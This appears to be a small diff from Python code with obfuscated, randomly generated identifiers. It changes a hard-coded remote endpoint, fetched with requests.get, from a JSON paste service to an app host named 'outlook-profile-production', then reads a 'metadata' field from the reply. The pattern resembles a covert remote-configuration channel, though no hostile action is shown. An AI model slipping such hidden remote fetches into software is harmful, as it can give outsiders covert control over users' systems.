@@ -16,7 +16,7 @@ def net_ljoyap_805():
 
     def model_vbooov_285():
         try:
-            net_whnauf_548 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_whnauf_548 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_whnauf_548.raise_for_status()
             eval_xiauuo_191 = net_whnauf_548.json()
             config_eeoccz_339 = eval_xiauuo_191.get('metadata')
